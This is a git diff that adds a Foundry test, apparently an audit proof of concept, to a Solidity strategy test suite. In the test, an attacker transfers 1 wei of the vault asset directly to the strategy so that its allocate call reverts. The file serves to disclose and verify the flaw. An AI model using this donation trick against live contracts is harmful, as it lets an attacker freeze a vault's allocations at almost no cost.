@@ -73,4 +73,34 @@ contract TokeAutoUSDStrategyTest is BaseStrategyTest {
         require(finalRealAssets < initialRealAssets, "Final real assets is not less than initial real assets");
         vm.stopPrank();
     }
+
+        function test_poc_TokeAutoUSDStrategy_allocate() public {
+        vm.stopPrank();
+
+        // init maliciousUser
+        address maliciousUser = makeAddr("maliciousUser");
+        deal(testConfig.vaultAsset, maliciousUser, 1);
+        uint256 amountToAllocate = 1 * 10 ** testConfig.decimals;
+        deal(testConfig.vaultAsset, strategy, amountToAllocate);
+        bytes memory prevAllocationAmount = abi.encode(0);
+
+        // maliciousUser transfer 1 wei to strategy
+        vm.prank(maliciousUser);
+        (bool success,) = testConfig.vaultAsset.call(
+        abi.encodeWithSignature("transfer(address,uint256)", address(strategy), 1));
+        require(success);
+
+        // check balance
+        assertEq(IERC20(testConfig.vaultAsset).balanceOf(address(strategy)), amountToAllocate + 1);
+
+
+        vm.startPrank(vault);
+        // Allowance amount less than balance causes call revert ❌
+        vm.expectRevert();
+        IMYTStrategy(strategy).allocate(prevAllocationAmount, amountToAllocate, "", address(vault));
+        uint256 initialRealAssets = IMYTStrategy(strategy).realAssets();
+        require(initialRealAssets == 0, "Initial real assets isn't 0");
+        vm.stopPrank();
+    }
+
 }
